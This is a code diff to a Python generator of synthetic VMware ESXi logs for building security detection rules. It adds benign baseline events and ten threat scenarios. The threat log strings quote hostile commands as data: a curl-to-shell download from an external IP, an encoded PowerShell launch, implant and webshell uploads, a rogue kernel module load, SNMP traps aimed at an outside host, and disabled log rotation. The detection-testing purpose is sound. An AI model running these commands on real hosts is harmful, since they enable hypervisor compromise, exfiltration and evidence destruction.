@@ -102,6 +102,18 @@ _THREATS = [
     {"event": "mass_vm_power_off", "weight": 2, "analytic": False, "xsiam_alert": None},
     {"event": "remote_syslog_disabled", "weight": 2, "analytic": False, "xsiam_alert": None},
     {"event": "vm_disk_export", "weight": 2, "analytic": False, "xsiam_alert": None},
+    # Top-tier custom-rule targets (no shipped analytic; clear log evidence). See the
+    # generators and docs/modules/vmware-esxi.md "Custom-rule targets".
+    {"event": "guest_ops_exec", "weight": 3, "analytic": False, "xsiam_alert": None},
+    {"event": "datastore_upload", "weight": 2, "analytic": False, "xsiam_alert": None},
+    {"event": "vm_disk_attach", "weight": 2, "analytic": False, "xsiam_alert": None},
+    {"event": "kernel_module_load", "weight": 2, "analytic": False, "xsiam_alert": None},
+    {"event": "promiscuous_mode", "weight": 2, "analytic": False, "xsiam_alert": None},
+    {"event": "unplanned_reboot", "weight": 2, "analytic": False, "xsiam_alert": None},
+    {"event": "snmp_external_target", "weight": 2, "analytic": False, "xsiam_alert": None},
+    {"event": "log_rotation_disabled", "weight": 2, "analytic": False, "xsiam_alert": None},
+    {"event": "config_harvest", "weight": 2, "analytic": False, "xsiam_alert": None},
+    {"event": "permission_denied_burst", "weight": 2, "analytic": False, "xsiam_alert": None},
 ]
 
 # Commands seen routinely on healthy ESXi hosts — the 30-day training baseline for the
@@ -519,10 +531,17 @@ def _b_snapshot(config, host, session_context):
 
 
 def _b_maintenance_mode(config, host, session_context):
-    """Host entering / exiting maintenance mode — routine around patching and vMotion."""
+    """Host entering / exiting maintenance mode, and the PLANNED reboot that happens
+    inside a maintenance window — the baseline the unplanned_reboot threat stands against
+    (a reboot with no surrounding maintenance event is the signal)."""
     user, src = _resolve_admin(config, session_context)
-    state = random.choice(["has entered maintenance mode", "has exited maintenance mode"])
     ev = random.randint(900000, 999999)
+    choice = random.choices(["enter", "exit", "planned_reboot"], weights=[40, 40, 20], k=1)[0]
+    if choice == "planned_reboot":
+        return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
+                           f"Event {ev} : Host {host} is being rebooted by {user}@{src} "
+                           f"(in maintenance mode, no running VMs)", opid=_opid(), user=user)
+    state = "has entered maintenance mode" if choice == "enter" else "has exited maintenance mode"
     return _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                        f"Event {ev} : Host {host} {state}", opid=_opid(), user=user)
 
@@ -924,14 +943,33 @@ def _b_datastore_ops(config, host, session_context):
     """Routine datastore / storage administration — HBA rescan, NFS mount, capacity, grow."""
     ds = random.choice(_datastores(config))
     ev = random.randint(900000, 999999)
+    iso = random.choice(["ubuntu-24.04.iso", "Win2022.iso", "rhel9.iso", "vcenter-template.ovf"])
     body = random.choice([
         f"Event {ev} : Rescan of all HBAs on {host} completed",
         f"Event {ev} : NFS datastore {ds} mounted on {host}",
         f"Event {ev} : Datastore {ds} on {host} is {random.randint(60, 88)}% full",
         f"Event {ev} : VMFS volume {ds} was expanded on {host}",
+        f"Event {ev} : File upload to path /vmfs/volumes/{ds}/ISO/{iso} was initiated from "
+        f"{mgmt_plane.admin_source(config)} by svc_vcenter",
     ])
     sev = "warning" if ("% full" in body and int(body.split("% full")[0].split()[-1]) >= 85) else "info"
     return _hostd_line(config, host, sev, "Vmsvc.vm", body, opid=_opid())
+
+
+def _b_guest_ops(config, host, session_context):
+    """Routine VMware Tools / guest interaction — the legitimate baseline for the
+    guest_ops_exec threat (which pushes programs/files INTO guests). Here: Tools-driven
+    guest shutdown/restart, time sync, heartbeat, and Tools upgrades."""
+    vm = random.choice(_vms(config))
+    ev = random.randint(900000, 999999)
+    body = random.choice([
+        f"Event {ev} : Guest OS of {vm} on {host} was gracefully shut down via VMware Tools",
+        f"Event {ev} : Guest OS of {vm} on {host} was restarted via VMware Tools",
+        f"Event {ev} : VMware Tools on {vm} ({host}) was upgraded to the current version",
+        f"Event {ev} : Time synchronized with guest {vm} via VMware Tools on {host}",
+        f"Event {ev} : VMware Tools heartbeat on {vm} ({host}) is green",
+    ])
+    return _hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{vm}", body, opid=_opid())
 
 
 # Benign mix — (generator, weight, human). `human` events are admin / config / login
@@ -956,7 +994,8 @@ _BENIGN_MIX = [
     (_b_account_admin,       4, True),   # create/disable/delete/lockout/password/role
     (_b_service_policy,      3, True),   # service startup policy + start/stop/restart
     (_b_storage,             3, False),
-    (_b_datastore_ops,       3, False),  # rescan / NFS mount / capacity / grow
+    (_b_datastore_ops,       3, False),  # rescan / NFS mount / capacity / grow / ISO upload
+    (_b_guest_ops,           3, False),  # VMware Tools guest ops (baseline for guest_ops_exec)
     (_b_stale_account_login, 3, False),  # login attempts vs disabled + deleted accounts
     (_b_snapshot,            3, False),
     (_b_maintenance_mode,    3, True),
@@ -1191,6 +1230,169 @@ def _vuln_scan(config, session_context=None):
     return logs
 
 
+# ── Top-tier custom-rule targets ───────────────────────────────────────────────
+# No shipped XSIAM analytic covers these, but each has clear log evidence and is a
+# strong manual correlation / BIOC target. Where a benign counterpart exists (guest ops,
+# datastore upload, disk add, planned reboot, portgroup Reject), the rule has a baseline
+# to stand out against.
+
+def _guest_ops_exec(config, session_context=None):
+    """Guest Operations (VIX) API abuse — programs/files pushed INTO guest VMs from the
+    management plane (hypervisor -> guest execution / lateral movement). hostd logs the
+    guest-op invocation with the in-guest auth and the program/file."""
+    host = random.choice(_hosts(config))
+    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.4)
+    logs = []
+    for vm in random.sample(_vms(config), k=random.randint(2, 4)):
+        op = random.choice([
+            "StartProgramInGuest: guestAuth=Administrator program='C:\\Windows\\System32\\"
+            "cmd.exe /c powershell -enc JABzAD0A...'",
+            f"StartProgramInGuest: guestAuth=root program='/bin/sh -c curl http://{rare_external_ip()}/x|sh'",
+            "InitiateFileTransferToGuest: guestAuth=root path='/tmp/.x/implant' size="
+            f"{random.randint(10**5, 10**7)}",
+            "ListProcessesInGuest: guestAuth=Administrator",
+        ])
+        logs.append(_hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{vm}",
+                    f"Guest operation {op} on vm={vm} invoked by {actor}@{src}",
+                    opid=_opid(), user=actor))
+    return logs
+
+
+def _datastore_upload(config, session_context=None):
+    """Suspicious file UPLOAD to a datastore over NFC — staging a webshell / ELF / script
+    / rogue ISO on shared storage. The upload counterpart to vm_disk_export; the benign
+    ISO/template upload in _b_datastore_ops is the baseline."""
+    host = random.choice(_hosts(config))
+    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.5)
+    ds = random.choice(_datastores(config))
+    logs = []
+    for _ in range(random.randint(1, 3)):
+        fn = random.choice(["/.sshdoor/implant.sh", "/.hidden/encryptor", "/x.py",
+                            "/webshell.php", "/tools/nc", "/ISO/rogue-boot.iso"])
+        logs.append(_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
+                    f"Event {random.randint(900000, 999999)} : File upload to path "
+                    f"/vmfs/volumes/{ds}{fn} was initiated from {src} by {actor}",
+                    opid=_opid(), user=actor))
+    return logs
+
+
+def _vm_disk_attach(config, session_context=None):
+    """A VM reconfigured to attach ANOTHER VM's virtual disk — offline data theft (mount a
+    DC / vault VM's -flat.vmdk onto a scratch VM to read it raw, bypassing the guest OS)."""
+    host = random.choice(_hosts(config))
+    actor, src = _resolve_admin(config, session_context)
+    vms = _vms(config)[:]
+    random.shuffle(vms)
+    victim = vms[0]
+    attacker_vm = vms[1] if len(vms) > 1 else "scratch-vm"
+    ds = random.choice(_datastores(config))
+    return [_hostd_line(config, host, "info", f"Vmsvc.vm:/vmfs/volumes/{attacker_vm}",
+            f"Reconfigured {attacker_vm} on {host}: added existing disk "
+            f"/vmfs/volumes/{ds}/{victim}/{victim}-flat.vmdk (mode independent-nonpersistent) "
+            f"by {actor}@{src}", opid=_opid(), user=actor)]
+
+
+def _kernel_module_load(config, session_context=None):
+    """Loading a non-standard / unsigned VMkernel module — rootkit / backdoor staging
+    (VIRTUALPITA-style). esxcli module load + a vmkernel load warning for a module outside
+    the shipped signed set."""
+    host = random.choice(_hosts(config))
+    mod = random.choice(["vmwdbg", "nsx-shim", "vmkmgmt_hook", "procfs_hook", "hostd_aux"])
+    return [
+        _cmd_line(config, host, f"/bin/esxcli system module load -m {mod}"),
+        _vmkernel_line(config, host, "Mod",
+                       f"Loaded module {mod} from /tmp/.x/{mod}.ko (not in VMware signed set)",
+                       severity="warning"),
+    ]
+
+
+def _promiscuous_mode(config, session_context=None):
+    """A port group's security policy set to ACCEPT promiscuous mode / forged transmits —
+    a virtual network tap for sniffing guest traffic. The benign baseline (_b_config_change)
+    only ever sets these to Reject, so Accept is the signal."""
+    host = random.choice(_hosts(config))
+    actor, src = _resolve_admin(config, session_context)
+    pg = random.choice(_PORTGROUPS)
+    policy = random.choice(["promiscuous mode", "forged transmits", "MAC address changes"])
+    return _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
+        f"Event {random.randint(900000, 999999)} : Security policy on port group '{pg}' "
+        f"updated: {policy} set to Accept by {actor}@{src}", opid=_opid(), user=actor)
+
+
+def _unplanned_reboot(config, session_context=None):
+    """Host reboot / shutdown with no maintenance-mode window — ransomware rebooting into
+    its payload, or a disruptive availability action (VMs not cleanly stopped)."""
+    host = random.choice(_hosts(config))
+    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.4)
+    act = "reboot" if random.random() < 0.6 else "shutdown"
+    verb = "rebooted" if act == "reboot" else "shut down"
+    return [
+        _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
+            f"Event {random.randint(900000, 999999)} : Host {host} is being {verb} by "
+            f"{actor}@{src} (host not in maintenance mode)", opid=_opid(), user=actor),
+        _vmkernel_line(config, host, "Reboot",
+            f"User-initiated {act}; {random.randint(1, 40)} running VMs were not cleanly "
+            f"powered off", severity="warning"),
+    ]
+
+
+def _snmp_external_target(config, session_context=None):
+    """SNMP enabled with its trap target set to an EXTERNAL host — turning host telemetry
+    into an exfil / C2 channel."""
+    host = random.choice(_hosts(config))
+    actor, src = _resolve_admin(config, session_context)
+    ext = rare_external_ip()
+    return [
+        _cmd_line(config, host, f"/bin/esxcli system snmp set -e true -c public -t {ext}@162/public"),
+        _hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
+            f"Event {random.randint(900000, 999999)} : SNMP agent enabled with trap target "
+            f"{ext}:162 on {host} by {actor}@{src}", opid=_opid(), user=actor),
+    ]
+
+
+def _log_rotation_disabled(config, session_context=None):
+    """Syslog rotation neutered (size/rotate 0) or the log dir redirected to a volatile
+    path — anti-forensics that keeps the host 'logging' while nothing is retained."""
+    host = random.choice(_hosts(config))
+    actor, src = _resolve_admin(config, session_context)
+    return [
+        _cmd_line(config, host, "/bin/esxcli system syslog config logger set -i hostd --size 0 --rotate 0"),
+        _hostd_line(config, host, "info", "Vimsvc",
+            'Set called with key "Syslog.global.logDir", value "/tmp"', opid=_opid(), user=actor),
+        _vobd_line(config, host, "vob.user.syslog.config.changed",
+            "Syslog configuration has changed; log rotation disabled."),
+    ]
+
+
+def _config_harvest(config, session_context=None):
+    """One session pulling the whole host configuration in a burst — scripted recon /
+    config harvesting (many esxcli / vim-cmd get/list in seconds from one source)."""
+    host = random.choice(_hosts(config))
+    reads = ["/bin/esxcli system settings advanced list", "/bin/esxcli network firewall ruleset list",
+             "/bin/esxcli system account list", "/bin/esxcli system permission list",
+             "/bin/vim-cmd vmsvc/getallvms", "/bin/esxcli storage filesystem list",
+             "/bin/esxcli network ip interface list", "/bin/esxcli system snmp get",
+             "/bin/vim-cmd hostsvc/hostsummary", "/bin/esxcli software vib list"]
+    return [_cmd_line(config, host, c)
+            for c in random.sample(reads, k=random.randint(6, len(reads)))]
+
+
+def _permission_denied_burst(config, session_context=None):
+    """Repeated authorization failures for one identity across operations — privilege
+    mapping / recon by a low-priv or stolen account."""
+    host = random.choice(_hosts(config))
+    user, src = _resolve_admin(config, session_context)
+    ops = ["HostConfigManager.firewallSystem", "AccountManager.createUser",
+           "HostStorageSystem.rescanAllHba", "HostServiceSystem.startService",
+           "DatastoreBrowser.deleteFile", "HostNetworkSystem.updatePortGroup"]
+    logs = []
+    for _ in range(random.randint(6, 12)):
+        logs.append(_hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
+            f"Event {random.randint(900000, 999999)} : Permission to perform this operation "
+            f"was denied for user {user}@{src} on {random.choice(ops)}", opid=_opid(), user=user))
+    return logs
+
+
 _THREAT_FUNCS = {
     "uncommon_host_command": _uncommon_host_command,
     "vuln_scan": _vuln_scan,
@@ -1201,6 +1403,16 @@ _THREAT_FUNCS = {
     "mass_vm_power_off": _mass_vm_power_off,
     "remote_syslog_disabled": _remote_syslog_disabled,
     "vm_disk_export": _vm_disk_export,
+    "guest_ops_exec": _guest_ops_exec,
+    "datastore_upload": _datastore_upload,
+    "vm_disk_attach": _vm_disk_attach,
+    "kernel_module_load": _kernel_module_load,
+    "promiscuous_mode": _promiscuous_mode,
+    "unplanned_reboot": _unplanned_reboot,
+    "snmp_external_target": _snmp_external_target,
+    "log_rotation_disabled": _log_rotation_disabled,
+    "config_harvest": _config_harvest,
+    "permission_denied_burst": _permission_denied_burst,
 }
 
 
